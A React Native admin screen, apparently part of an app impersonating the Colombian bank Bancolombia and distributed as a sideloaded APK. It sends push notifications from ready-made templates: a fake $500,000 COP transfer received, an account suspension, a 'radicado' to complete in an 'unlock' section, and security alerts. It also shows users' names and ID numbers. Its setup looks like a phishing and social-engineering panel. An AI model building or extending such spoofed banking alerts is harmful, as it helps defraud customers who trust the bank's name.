import { Feather } from "@expo/vector-icons";
import { useRouter } from "expo-router";
import React, { useCallback, useEffect, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  FlatList,
  Modal,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";
import { useApp } from "@/context/AppContext";
import { apiUrl } from "@/utils/api";
import type { RegisteredUser } from "@/context/AppContext";

const BG       = "#0A0E27";
const CARD     = "#111827";
const CARD2    = "#0D1123";
const BORDER   = "rgba(253,218,36,0.18)";
const TEXT     = "#FFFFFF";
const TEXTSEC  = "rgba(255,255,255,0.45)";
const YELLOW   = "#FDDA24";
const GREEN    = "#10B981";
const RED      = "#EF4444";
const BLUE     = "#3B82F6";
const ORANGE   = "#F59E0B";
const PURPLE   = "#A78BFA";

/* ────────────────────────────────────────────────────────
   6 PLANTILLAS PREDEFINIDAS
──────────────────────────────────────────────────────── */
const TEMPLATES = [
  {
    id: "transfer_received",
    icon: "arrow-down-circle" as const,
    color: GREEN,
    label: "Transferencia recibida",
    channelId: "banking",
    title: "💰 Transferencia recibida",
    body: "Has recibido $500,000 COP. Tu saldo disponible se ha actualizado. Revisa tu estado de cuenta.",
  },
  {
    id: "verification_success",
    icon: "check-circle" as const,
    color: GREEN,
    label: "Verificación exitosa",
    channelId: "account",
    title: "✅ Verificación aprobada",
    body: "Tu identidad ha sido verificada exitosamente. Ya tienes acceso completo a todos los servicios de Mi Bancolombia.",
  },
  {
    id: "account_suspended",
    icon: "alert-circle" as const,
    color: RED,
    label: "Cuenta suspendida",
    channelId: "security",
    title: "⚠️ Cuenta suspendida",
    body: "Tu cuenta ha sido suspendida temporalmente. Por favor ingresa a la app y sigue los pasos indicados o contacta a soporte.",
  },
  {
    id: "radicado_assigned",
    icon: "file-text" as const,
    color: BLUE,
    label: "Radicado asignado",
    channelId: "documents",
    title: "📋 Radicado asignado",
    body: "Se te ha asignado un radicado para completar tu proceso de verificación de documentos. Ábrelo en la sección de desbloqueo.",
  },
  {
    id: "pin_approved",
    icon: "lock" as const,
    color: YELLOW,
    label: "Cambio de PIN aprobado",
    channelId: "account",
    title: "🔐 Cambio de PIN aprobado",
    body: "Tu solicitud de cambio de PIN ha sido aprobada. Ya puedes ingresar con tu nuevo PIN de seguridad.",
  },
  {
    id: "security_alert",
    icon: "shield" as const,
    color: ORANGE,
    label: "Alerta de seguridad",
    channelId: "security",
    title: "🛡️ Alerta de seguridad",
    body: "Detectamos un inicio de sesión desde un nuevo dispositivo o ubicación. Si no fuiste tú, contacta con soporte de inmediato.",
  },
];

const COLORS = [
  { label: "Verde",   hex: GREEN },
  { label: "Rojo",    hex: RED },
  { label: "Azul",    hex: BLUE },
  { label: "Amarillo",hex: YELLOW },
  { label: "Naranja", hex: ORANGE },
  { label: "Púrpura", hex: PURPLE },
  { label: "Cyan",    hex: "#06B6D4" },
  { label: "Rosa",    hex: "#EC4899" },
];

const CHANNELS = [
  { id: "default",   label: "General" },
  { id: "banking",   label: "Operaciones bancarias" },
  { id: "security",  label: "Seguridad" },
  { id: "account",   label: "Estado de cuenta" },
  { id: "documents", label: "Documentos" },
];

type SendResult = {
  sentCount: number;
  tokensFound: number;
  logId: string;
  ok: boolean;
};

type NotifLog = {
  id: string;
  title: string;
  body: string;
  color: string;
  targetType: string;
  sentCount: number;
  createdAt: string;
};

export default function NotificacionesScreen() {
  const { currentUser, getAllUsers } = useApp();
  const insets = useSafeAreaInsets();
  const router = useRouter();

  /* ─── Form state ─── */
  const [selectedTemplate, setSelectedTemplate] = useState(TEMPLATES[0]);
  const [title, setTitle]     = useState(TEMPLATES[0].title);
  const [body, setBody]       = useState(TEMPLATES[0].body);
  const [color, setColor]     = useState(TEMPLATES[0].color);
  const [customColor, setCustomColor] = useState("");
  const [channelId, setChannelId] = useState(TEMPLATES[0].channelId);

  /* ─── Recipients state ─── */
  const [targetType, setTargetType] = useState<"all" | "users">("all");
  const [users, setUsers]           = useState<RegisteredUser[]>([]);
  const [selectedUsers, setSelectedUsers] = useState<string[]>([]);
  const [userSearch, setUserSearch]       = useState("");
  const [showUserPicker, setShowUserPicker] = useState(false);

  /* ─── Send state ─── */
  const [sending, setSending]   = useState(false);
  const [result, setResult]     = useState<SendResult | null>(null);

  /* ─── History ─── */
  const [history, setHistory]   = useState<NotifLog[]>([]);
  const [historyExpanded, setHistoryExpanded] = useState(false);

  const effectiveColor = customColor.startsWith("#") && customColor.length >= 4
    ? customColor
    : color;

  const loadUsers = useCallback(async () => {
    const all = await getAllUsers();
    setUsers(all.filter((u: RegisteredUser) => !u.isAdmin));
  }, [getAllUsers]);

  const loadHistory = useCallback(async () => {
    try {
      const res = await fetch(apiUrl("/api/notifications/log"));
      const data = await res.json();
      setHistory(Array.isArray(data) ? data.slice(0, 20) : []);
    } catch { /* ignore */ }
  }, []);

  useEffect(() => {
    void loadUsers();
    void loadHistory();
  }, [loadUsers, loadHistory]);

  const applyTemplate = (tpl: typeof TEMPLATES[0]) => {
    setSelectedTemplate(tpl);
    setTitle(tpl.title);
    setBody(tpl.body);
    setColor(tpl.color);
    setCustomColor("");
    setChannelId(tpl.channelId);
  };

  const toggleUser = (userId: string) => {
    setSelectedUsers((prev) =>
      prev.includes(userId) ? prev.filter((id) => id !== userId) : [...prev, userId]
    );
  };

  const filteredUsers = users.filter((u) => {
    const q = userSearch.toLowerCase();
    return (
      u.firstName.toLowerCase().includes(q) ||
      u.lastName.toLowerCase().includes(q) ||
      u.documentNumber.includes(q)
    );
  });

  const handleSend = async () => {
    if (!title.trim() || !body.trim()) {
      Alert.alert("Campos requeridos", "El título y el cuerpo son obligatorios.");
      return;
    }
    if (targetType === "users" && selectedUsers.length === 0) {
      Alert.alert("Destinatarios", "Selecciona al menos un usuario.");
      return;
    }

    setSending(true);
    setResult(null);
    try {
      const res = await fetch(apiUrl("/api/notifications/send"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          adminId: currentUser?.id ?? "admin",
          title: title.trim(),
          body: body.trim(),
          color: effectiveColor,
          channelId,
          targetType,
          targetUserIds: targetType === "users" ? selectedUsers : [],
          data: { template: selectedTemplate.id },
        }),
      });
      const data: SendResult = await res.json();
      setResult(data);
      void loadHistory();
    } catch (err) {
      Alert.alert("Error", "No se pudo enviar la notificación.");
    } finally {
      setSending(false);
    }
  };

  const selectedUserNames = users
    .filter((u) => selectedUsers.includes(u.id))
    .map((u) => `${u.firstName} ${u.lastName}`)
    .join(", ");

  return (
    <View style={[styles.container, { paddingTop: insets.top }]}>
      {/* Header */}
      <View style={styles.header}>
        <TouchableOpacity onPress={() => router.back()} style={styles.backBtn}>
          <Feather name="arrow-left" size={20} color={TEXT} />
        </TouchableOpacity>
        <View style={{ flex: 1 }}>
          <Text style={styles.headerTitle}>Centro de notificaciones</Text>
          <Text style={styles.headerSub}>Envía alertas a los APK instalados</Text>
        </View>
        <TouchableOpacity onPress={loadHistory} style={styles.refreshBtn}>
          <Feather name="refresh-cw" size={18} color={YELLOW} />
        </TouchableOpacity>
      </View>

      <ScrollView
        contentContainerStyle={{ padding: 16, paddingBottom: 60, gap: 20 }}
        showsVerticalScrollIndicator={false}
        keyboardShouldPersistTaps="handled"
      >

        {/* ── TEMPLATES ── */}
        <View>
          <Text style={styles.sectionLabel}>PLANTILLAS</Text>
          <View style={styles.templateGrid}>
            {TEMPLATES.map((tpl) => {
              const active = selectedTemplate.id === tpl.id;
              return (
                <TouchableOpacity
                  key={tpl.id}
                  style={[
                    styles.templateCard,
                    { borderColor: active ? tpl.color : BORDER },
                    active && { backgroundColor: tpl.color + "18" },
                  ]}
                  onPress={() => applyTemplate(tpl)}
                  activeOpacity={0.8}
                >
                  <View style={[styles.tplIcon, { backgroundColor: tpl.color + "22" }]}>
                    <Feather name={tpl.icon} size={18} color={tpl.color} />
                  </View>
                  <Text style={[styles.tplLabel, active && { color: tpl.color }]} numberOfLines={2}>
                    {tpl.label}
                  </Text>
                  {active && (
                    <View style={[styles.tplCheck, { backgroundColor: tpl.color }]}>
                      <Feather name="check" size={10} color="#fff" />
                    </View>
                  )}
                </TouchableOpacity>
              );
            })}
          </View>
        </View>

        {/* ── EDIT CONTENT ── */}
        <View style={{ gap: 10 }}>
          <Text style={styles.sectionLabel}>EDITAR CONTENIDO</Text>

          <View style={styles.inputGroup}>
            <Text style={styles.inputLabel}>Título de la notificación</Text>
            <TextInput
              style={[styles.input, { borderColor: effectiveColor + "60" }]}
              value={title}
              onChangeText={setTitle}
              placeholder="Título que verá el usuario"
              placeholderTextColor={TEXTSEC}
              maxLength={80}
              returnKeyType="next"
            />
            <Text style={styles.charCount}>{title.length}/80</Text>
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.inputLabel}>Cuerpo del mensaje</Text>
            <TextInput
              style={[styles.input, styles.inputMulti, { borderColor: effectiveColor + "60" }]}
              value={body}
              onChangeText={setBody}
              placeholder="Mensaje detallado que verá el usuario"
              placeholderTextColor={TEXTSEC}
              multiline
              numberOfLines={4}
              maxLength={300}
              textAlignVertical="top"
            />
            <Text style={styles.charCount}>{body.length}/300</Text>
          </View>
        </View>

        {/* ── COLOR ── */}
        <View style={{ gap: 10 }}>
          <Text style={styles.sectionLabel}>COLOR DE LA NOTIFICACIÓN</Text>
          <View style={styles.colorGrid}>
            {COLORS.map((c) => (
              <TouchableOpacity
                key={c.hex}
                style={[
                  styles.colorSwatch,
                  { backgroundColor: c.hex },
                  color === c.hex && !customColor && styles.colorSwatchActive,
                ]}
                onPress={() => { setColor(c.hex); setCustomColor(""); }}
              >
                {color === c.hex && !customColor && (
                  <Feather name="check" size={14} color="#fff" />
                )}
              </TouchableOpacity>
            ))}
          </View>
          <View style={styles.inputGroup}>
            <Text style={styles.inputLabel}>Color personalizado (hex)</Text>
            <View style={styles.customColorRow}>
              <View style={[styles.customColorPreview, { backgroundColor: effectiveColor }]} />
              <TextInput
                style={[styles.input, { flex: 1, marginBottom: 0 }]}
                value={customColor}
                onChangeText={setCustomColor}
                placeholder="#FDDA24"
                placeholderTextColor={TEXTSEC}
                maxLength={7}
                autoCapitalize="characters"
                returnKeyType="done"
              />
            </View>
          </View>
        </View>

        {/* ── CHANNEL ── */}
        <View style={{ gap: 10 }}>
          <Text style={styles.sectionLabel}>CANAL ANDROID</Text>
          <View style={styles.channelRow}>
            {CHANNELS.map((ch) => (
              <TouchableOpacity
                key={ch.id}
                style={[styles.channelChip, channelId === ch.id && { backgroundColor: effectiveColor + "22", borderColor: effectiveColor }]}
                onPress={() => setChannelId(ch.id)}
              >
                <Text style={[styles.channelChipText, channelId === ch.id && { color: effectiveColor }]}>
                  {ch.label}
                </Text>
              </TouchableOpacity>
            ))}
          </View>
          <Text style={styles.helpText}>
            El canal determina cómo Android agrupa y muestra la notificación en el cajón de notificaciones.
          </Text>
        </View>

        {/* ── PREVIEW ── */}
        <View style={{ gap: 10 }}>
          <Text style={styles.sectionLabel}>VISTA PREVIA — Así la verá el usuario</Text>
          <View style={[styles.previewCard, { borderColor: effectiveColor + "50" }]}>
            <View style={[styles.previewStripe, { backgroundColor: effectiveColor }]} />
            <View style={{ flex: 1, paddingLeft: 12, gap: 4 }}>
              <View style={styles.previewTopRow}>
                <View style={[styles.previewAppIcon, { backgroundColor: effectiveColor }]}>
                  <Text style={styles.previewIconText}>B</Text>
                </View>
                <Text style={styles.previewAppName}>Mi Bancolombia</Text>
                <Text style={styles.previewTime}>ahora</Text>
              </View>
              <Text style={styles.previewTitle} numberOfLines={1}>
                {title || "Título de la notificación"}
              </Text>
              <Text style={styles.previewBody} numberOfLines={3}>
                {body || "Cuerpo del mensaje..."}
              </Text>
            </View>
          </View>
        </View>

        {/* ── RECIPIENTS ── */}
        <View style={{ gap: 10 }}>
          <Text style={styles.sectionLabel}>DESTINATARIOS</Text>
          <View style={styles.recipientRow}>
            <TouchableOpacity
              style={[styles.recipientBtn, targetType === "all" && { backgroundColor: effectiveColor + "22", borderColor: effectiveColor }]}
              onPress={() => setTargetType("all")}
            >
              <Feather name="radio" size={16} color={targetType === "all" ? effectiveColor : TEXTSEC} />
              <Text style={[styles.recipientBtnText, targetType === "all" && { color: effectiveColor }]}>
                Todos los APK
              </Text>
            </TouchableOpacity>
            <TouchableOpacity
              style={[styles.recipientBtn, targetType === "users" && { backgroundColor: effectiveColor + "22", borderColor: effectiveColor }]}
              onPress={() => { setTargetType("users"); setShowUserPicker(true); }}
            >
              <Feather name="user-check" size={16} color={targetType === "users" ? effectiveColor : TEXTSEC} />
              <Text style={[styles.recipientBtnText, targetType === "users" && { color: effectiveColor }]}>
                Usuario específico
              </Text>
            </TouchableOpacity>
          </View>

          {targetType === "users" && (
            <TouchableOpacity
              style={[styles.userPickerBtn, { borderColor: effectiveColor + "40" }]}
              onPress={() => setShowUserPicker(true)}
            >
              <Feather name="users" size={15} color={effectiveColor} />
              <Text style={[styles.userPickerText, { color: selectedUsers.length ? TEXT : TEXTSEC }]} numberOfLines={2}>
                {selectedUsers.length === 0
                  ? "Toca para seleccionar usuarios"
                  : `${selectedUsers.length} usuario${selectedUsers.length > 1 ? "s" : ""}: ${selectedUserNames}`}
              </Text>
              <Feather name="chevron-right" size={15} color={TEXTSEC} />
            </TouchableOpacity>
          )}
        </View>

        {/* ── SEND BUTTON ── */}
        <TouchableOpacity
          style={[styles.sendBtn, { backgroundColor: effectiveColor }, sending && { opacity: 0.7 }]}
          onPress={handleSend}
          disabled={sending}
          activeOpacity={0.85}
        >
          {sending ? (
            <ActivityIndicator color={effectiveColor === YELLOW ? "#1C1C1E" : "#fff"} />
          ) : (
            <>
              <Feather name="send" size={18} color={effectiveColor === YELLOW ? "#1C1C1E" : "#fff"} />
              <Text style={[styles.sendBtnText, { color: effectiveColor === YELLOW ? "#1C1C1E" : "#fff" }]}>
                Enviar notificación
              </Text>
            </>
          )}
        </TouchableOpacity>

        {/* ── RESULT ── */}
        {result && (
          <View style={[styles.resultCard, {
            borderColor: result.sentCount > 0 ? GREEN + "50" : ORANGE + "50",
            backgroundColor: result.sentCount > 0 ? GREEN + "10" : ORANGE + "10",
          }]}>
            <Feather
              name={result.sentCount > 0 ? "check-circle" : "alert-triangle"}
              size={20}
              color={result.sentCount > 0 ? GREEN : ORANGE}
            />
            <View style={{ flex: 1, gap: 3 }}>
              <Text style={[styles.resultTitle, { color: result.sentCount > 0 ? GREEN : ORANGE }]}>
                {result.sentCount > 0
                  ? `✓ Enviada a ${result.sentCount} dispositivo${result.sentCount > 1 ? "s" : ""}`
                  : "Sin dispositivos registrados"}
              </Text>
              <Text style={styles.resultSub}>
                APKs con token: {result.tokensFound} · ID: {result.logId?.slice(0, 8)}...
              </Text>
              {result.tokensFound === 0 && (
                <Text style={[styles.resultSub, { color: ORANGE, marginTop: 4 }]}>
                  Ningún usuario ha instalado el APK con las notificaciones configuradas aún.
                </Text>
              )}
            </View>
          </View>
        )}

        {/* ── HISTORY ── */}
        {history.length > 0 && (
          <View style={{ gap: 8 }}>
            <TouchableOpacity
              style={styles.historyHeader}
              onPress={() => setHistoryExpanded(!historyExpanded)}
            >
              <Text style={styles.sectionLabel}>HISTORIAL — Últimas {history.length} enviadas</Text>
              <Feather name={historyExpanded ? "chevron-up" : "chevron-down"} size={14} color={TEXTSEC} />
            </TouchableOpacity>
            {historyExpanded && history.map((n) => (
              <View key={n.id} style={[styles.historyCard, { borderLeftColor: n.color || YELLOW }]}>
                <View style={[styles.historyDot, { backgroundColor: n.color || YELLOW }]} />
                <View style={{ flex: 1, gap: 2 }}>
                  <Text style={styles.historyTitle} numberOfLines={1}>{n.title}</Text>
                  <Text style={styles.historySub} numberOfLines={1}>{n.body}</Text>
                  <Text style={styles.historyMeta}>
                    {n.targetType === "all" ? "Todos" : "Específico"} · {n.sentCount} enviadas · {fmtDate(n.createdAt)}
                  </Text>
                </View>
              </View>
            ))}
          </View>
        )}

        {/* ── API DOCS ── */}
        <ApiDocsSection />

      </ScrollView>

      {/* User Picker Modal */}
      <Modal
        visible={showUserPicker}
        animationType="slide"
        presentationStyle="pageSheet"
        onRequestClose={() => setShowUserPicker(false)}
      >
        <View style={[styles.pickerModal, { paddingTop: insets.top + 8 }]}>
          <View style={styles.pickerHeader}>
            <Text style={styles.pickerTitle}>Seleccionar usuarios</Text>
            <TouchableOpacity onPress={() => setShowUserPicker(false)}>
              <Feather name="x" size={22} color={TEXT} />
            </TouchableOpacity>
          </View>
          <View style={styles.searchRow}>
            <Feather name="search" size={15} color={TEXTSEC} />
            <TextInput
              style={styles.searchInput}
              value={userSearch}
              onChangeText={setUserSearch}
              placeholder="Buscar por nombre o documento"
              placeholderTextColor={TEXTSEC}
            />
          </View>
          <FlatList
            data={filteredUsers}
            keyExtractor={(u) => u.id}
            contentContainerStyle={{ padding: 12, gap: 8 }}
            renderItem={({ item }) => {
              const selected = selectedUsers.includes(item.id);
              return (
                <TouchableOpacity
                  style={[styles.pickerItem, selected && { backgroundColor: BLUE + "20", borderColor: BLUE }]}
                  onPress={() => toggleUser(item.id)}
                >
                  <View style={[styles.pickerCheck, selected && { backgroundColor: BLUE, borderColor: BLUE }]}>
                    {selected && <Feather name="check" size={12} color="#fff" />}
                  </View>
                  <View style={{ flex: 1 }}>
                    <Text style={styles.pickerItemName}>{item.firstName} {item.lastName}</Text>
                    <Text style={styles.pickerItemDoc}>{item.documentType} {item.documentNumber}</Text>
                  </View>
                  <View style={[styles.statusDot, {
                    backgroundColor: item.status === "active" ? GREEN : item.status === "suspended" ? ORANGE : RED
                  }]} />
                </TouchableOpacity>
              );
            }}
          />
          <View style={styles.pickerFooter}>
            <TouchableOpacity
              style={styles.pickerDoneBtn}
              onPress={() => setShowUserPicker(false)}
            >
              <Text style={styles.pickerDoneText}>
                Confirmar ({selectedUsers.length} seleccionado{selectedUsers.length !== 1 ? "s" : ""})
              </Text>
            </TouchableOpacity>
          </View>
        </View>
      </Modal>
    </View>
  );
}

/* ────────────────────────────────────────────────────────
   API DOCS SECTION — parámetros exactos para el APK
──────────────────────────────────────────────────────── */
function ApiDocsSection() {
  const [open, setOpen] = useState(false);
  return (
    <View style={{ gap: 8 }}>
      <TouchableOpacity style={styles.docsToggle} onPress={() => setOpen(!open)}>
        <Feather name="code" size={14} color={BLUE} />
        <Text style={styles.docsToggleText}>API y parámetros para el APK</Text>
        <Feather name={open ? "chevron-up" : "chevron-down"} size={14} color={BLUE} />
      </TouchableOpacity>

      {open && (
        <View style={styles.docsCard}>
          <Text style={styles.docsTitle}>Variable de entorno requerida en el APK</Text>
          <View style={styles.codeBlock}>
            <Text style={styles.codeText}>EXPO_PUBLIC_PROJECT_ID=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</Text>
          </View>
          <Text style={styles.docsNote}>
            El Project ID se obtiene en expo.dev → tu proyecto → Settings. Añádelo como secreto en GitHub Actions.
          </Text>

          <Text style={[styles.docsTitle, { marginTop: 14 }]}>Secreto en GitHub Actions (.github/workflows/build-apk.yml)</Text>
          <View style={styles.codeBlock}>
            <Text style={styles.codeText}>{"- name: Escribir google-services.json\n  run: echo '${{ secrets.GOOGLE_SERVICES_JSON }}' > artifacts/mi-bancolombia/google-services.json\n\nenv:\n  EXPO_PUBLIC_PROJECT_ID: ${{ secrets.EXPO_PROJECT_ID }}"}</Text>
          </View>

          <Text style={[styles.docsTitle, { marginTop: 14 }]}>Endpoint — Registrar token (APK → servidor)</Text>
          <View style={styles.codeBlock}>
            <Text style={styles.codeText}>{"POST /api/push-tokens\n\n{\n  \"userId\": \"uuid-del-usuario\",\n  \"token\": \"ExponentPushToken[xxxxx]\",\n  \"platform\": \"android\",\n  \"deviceInfo\": \"Android 14\"\n}"}</Text>
          </View>

          <Text style={[styles.docsTitle, { marginTop: 14 }]}>Endpoint — Enviar notificación (admin → servidor)</Text>
          <View style={styles.codeBlock}>
            <Text style={styles.codeText}>{"POST /api/notifications/send\n\n{\n  \"adminId\": \"uuid-del-admin\",\n  \"title\": \"Título\",\n  \"body\": \"Mensaje\",\n  \"color\": \"#10B981\",\n  \"channelId\": \"banking\",\n  \"targetType\": \"all\",\n  \"targetUserIds\": []\n}\n\n// Para usuario específico:\n\"targetType\": \"users\",\n\"targetUserIds\": [\"uuid1\", \"uuid2\"]"}</Text>
          </View>

          <Text style={[styles.docsTitle, { marginTop: 14 }]}>Canales Android disponibles</Text>
          <View style={styles.codeBlock}>
            <Text style={styles.codeText}>{"default    → Notificaciones generales\nbanking    → Operaciones bancarias (saldo, transferencias)\nsecurity   → Alertas de seguridad (máxima prioridad)\naccount    → Estado de cuenta (suspensión, verificación)\ndocuments  → Documentos y radicados"}</Text>
          </View>

          <Text style={[styles.docsTitle, { marginTop: 14 }]}>Endpoint — Historial enviadas (admin)</Text>
          <View style={styles.codeBlock}>
            <Text style={styles.codeText}>{"GET /api/notifications/log\n\nRespuesta: array de las últimas 200 notificaciones"}</Text>
          </View>
        </View>
      )}
    </View>
  );
}

function fmtDate(iso: string) {
  try {
    return new Date(iso).toLocaleString("es-CO", {
      day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit",
    });
  } catch { return iso; }
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: BG },
  header: {
    flexDirection: "row", alignItems: "center", gap: 12,
    paddingHorizontal: 16, paddingBottom: 14, paddingTop: 8,
    backgroundColor: CARD, borderBottomWidth: 1, borderBottomColor: BORDER,
  },
  backBtn: { padding: 4 },
  headerTitle: { fontSize: 18, fontWeight: "700", color: TEXT, fontFamily: "Inter_700Bold" },
  headerSub: { fontSize: 12, color: TEXTSEC, fontFamily: "Inter_400Regular", marginTop: 1 },
  refreshBtn: { padding: 6 },

  sectionLabel: {
    fontSize: 10, fontWeight: "700", color: "rgba(255,255,255,0.3)",
    letterSpacing: 1.2, fontFamily: "Inter_700Bold", marginBottom: 2,
  },

  templateGrid: { flexDirection: "row", flexWrap: "wrap", gap: 10 },
  templateCard: {
    width: "30%", flexGrow: 1, backgroundColor: CARD,
    borderRadius: 14, padding: 12, borderWidth: 1, gap: 8,
    alignItems: "center", position: "relative",
  },
  tplIcon: { width: 40, height: 40, borderRadius: 12, alignItems: "center", justifyContent: "center" },
  tplLabel: { fontSize: 11, color: TEXTSEC, fontFamily: "Inter_500Medium", textAlign: "center" },
  tplCheck: {
    position: "absolute", top: 6, right: 6,
    width: 18, height: 18, borderRadius: 9,
    alignItems: "center", justifyContent: "center",
  },

  inputGroup: { gap: 4 },
  inputLabel: { fontSize: 10, color: TEXTSEC, fontFamily: "Inter_700Bold", letterSpacing: 0.8 },
  input: {
    backgroundColor: CARD, borderRadius: 10, borderWidth: 1,
    borderColor: BORDER, paddingHorizontal: 14, paddingVertical: 12,
    fontSize: 14, color: TEXT, fontFamily: "Inter_400Regular",
  },
  inputMulti: { minHeight: 90, paddingTop: 12 },
  charCount: { fontSize: 10, color: TEXTSEC, fontFamily: "Inter_400Regular", textAlign: "right" },

  colorGrid: { flexDirection: "row", flexWrap: "wrap", gap: 10 },
  colorSwatch: {
    width: 36, height: 36, borderRadius: 18,
    alignItems: "center", justifyContent: "center",
    borderWidth: 2, borderColor: "transparent",
  },
  colorSwatchActive: { borderColor: "#fff", transform: [{ scale: 1.15 }] },
  customColorRow: { flexDirection: "row", alignItems: "center", gap: 10 },
  customColorPreview: { width: 40, height: 40, borderRadius: 10, borderWidth: 2, borderColor: BORDER },

  channelRow: { flexDirection: "row", flexWrap: "wrap", gap: 8 },
  channelChip: {
    borderRadius: 20, paddingHorizontal: 12, paddingVertical: 6,
    borderWidth: 1, borderColor: BORDER, backgroundColor: CARD,
  },
  channelChipText: { fontSize: 12, color: TEXTSEC, fontFamily: "Inter_500Medium" },
  helpText: { fontSize: 11, color: TEXTSEC, fontFamily: "Inter_400Regular", lineHeight: 16 },

  previewCard: {
    backgroundColor: "#1C2035", borderRadius: 14, borderWidth: 1,
    overflow: "hidden", flexDirection: "row",
  },
  previewStripe: { width: 4 },
  previewTopRow: { flexDirection: "row", alignItems: "center", gap: 6, marginBottom: 4 },
  previewAppIcon: {
    width: 16, height: 16, borderRadius: 4,
    alignItems: "center", justifyContent: "center",
  },
  previewIconText: { fontSize: 10, fontWeight: "700", color: "#1C1C1E", fontFamily: "Inter_700Bold" },
  previewAppName: { fontSize: 11, color: TEXTSEC, fontFamily: "Inter_500Medium", flex: 1 },
  previewTime: { fontSize: 10, color: TEXTSEC, fontFamily: "Inter_400Regular" },
  previewTitle: {
    fontSize: 14, fontWeight: "700", color: TEXT,
    fontFamily: "Inter_700Bold", paddingVertical: 8,
  },
  previewBody: { fontSize: 13, color: "rgba(255,255,255,0.75)", fontFamily: "Inter_400Regular", lineHeight: 18, paddingBottom: 12 },

  recipientRow: { flexDirection: "row", gap: 10 },
  recipientBtn: {
    flex: 1, flexDirection: "row", alignItems: "center", gap: 8,
    backgroundColor: CARD, borderRadius: 12, padding: 12,
    borderWidth: 1, borderColor: BORDER,
  },
  recipientBtnText: { fontSize: 13, color: TEXTSEC, fontFamily: "Inter_500Medium" },
  userPickerBtn: {
    flexDirection: "row", alignItems: "center", gap: 10,
    backgroundColor: CARD, borderRadius: 12, padding: 12,
    borderWidth: 1,
  },
  userPickerText: { flex: 1, fontSize: 13, fontFamily: "Inter_400Regular" },

  sendBtn: {
    flexDirection: "row", alignItems: "center", justifyContent: "center",
    gap: 10, borderRadius: 14, paddingVertical: 16,
  },
  sendBtnText: { fontSize: 16, fontWeight: "700", fontFamily: "Inter_700Bold" },

  resultCard: {
    flexDirection: "row", alignItems: "flex-start", gap: 12,
    borderRadius: 14, padding: 14, borderWidth: 1,
  },
  resultTitle: { fontSize: 14, fontWeight: "700", fontFamily: "Inter_700Bold" },
  resultSub: { fontSize: 12, color: TEXTSEC, fontFamily: "Inter_400Regular" },

  historyHeader: { flexDirection: "row", alignItems: "center", justifyContent: "space-between" },
  historyCard: {
    flexDirection: "row", alignItems: "flex-start", gap: 10,
    backgroundColor: CARD2, borderRadius: 10, padding: 10,
    borderWidth: 1, borderColor: BORDER, borderLeftWidth: 3,
  },
  historyDot: { width: 8, height: 8, borderRadius: 4, marginTop: 4 },
  historyTitle: { fontSize: 13, fontWeight: "700", color: TEXT, fontFamily: "Inter_700Bold" },
  historySub: { fontSize: 11, color: TEXTSEC, fontFamily: "Inter_400Regular" },
  historyMeta: { fontSize: 10, color: TEXTSEC, fontFamily: "Inter_400Regular", marginTop: 2 },

  docsToggle: {
    flexDirection: "row", alignItems: "center", gap: 8,
    backgroundColor: BLUE + "15", borderRadius: 10, padding: 12,
    borderWidth: 1, borderColor: BLUE + "30",
  },
  docsToggleText: { flex: 1, fontSize: 13, color: BLUE, fontFamily: "Inter_500Medium" },
  docsCard: { backgroundColor: CARD2, borderRadius: 14, padding: 16, gap: 6, borderWidth: 1, borderColor: BORDER },
  docsTitle: { fontSize: 11, fontWeight: "700", color: TEXTSEC, fontFamily: "Inter_700Bold", letterSpacing: 0.5 },
  codeBlock: {
    backgroundColor: "#060B18", borderRadius: 8, padding: 12,
    borderWidth: 1, borderColor: "rgba(255,255,255,0.08)",
  },
  codeText: { fontSize: 11, color: "#7DD3FC", fontFamily: "Inter_400Regular", lineHeight: 17 },
  docsNote: { fontSize: 11, color: TEXTSEC, fontFamily: "Inter_400Regular", lineHeight: 16 },

  pickerModal: { flex: 1, backgroundColor: BG },
  pickerHeader: {
    flexDirection: "row", alignItems: "center", justifyContent: "space-between",
    paddingHorizontal: 16, paddingBottom: 14, paddingTop: 4,
    borderBottomWidth: 1, borderBottomColor: BORDER,
  },
  pickerTitle: { fontSize: 18, fontWeight: "700", color: TEXT, fontFamily: "Inter_700Bold" },
  searchRow: {
    flexDirection: "row", alignItems: "center", gap: 10,
    margin: 12, backgroundColor: CARD, borderRadius: 10,
    paddingHorizontal: 12, paddingVertical: 10,
    borderWidth: 1, borderColor: BORDER,
  },
  searchInput: { flex: 1, fontSize: 14, color: TEXT, fontFamily: "Inter_400Regular" },
  pickerItem: {
    flexDirection: "row", alignItems: "center", gap: 12,
    backgroundColor: CARD, borderRadius: 12, padding: 12,
    borderWidth: 1, borderColor: BORDER,
  },
  pickerCheck: {
    width: 22, height: 22, borderRadius: 11,
    borderWidth: 2, borderColor: BORDER,
    alignItems: "center", justifyContent: "center",
  },
  pickerItemName: { fontSize: 14, fontWeight: "700", color: TEXT, fontFamily: "Inter_700Bold" },
  pickerItemDoc: { fontSize: 12, color: TEXTSEC, fontFamily: "Inter_400Regular" },
  statusDot: { width: 8, height: 8, borderRadius: 4 },
  pickerFooter: { padding: 16, borderTopWidth: 1, borderTopColor: BORDER },
  pickerDoneBtn: {
    backgroundColor: YELLOW, borderRadius: 12,
    paddingVertical: 14, alignItems: "center",
  },
  pickerDoneText: { fontSize: 15, fontWeight: "700", color: "#1C1C1E", fontFamily: "Inter_700Bold" },
});
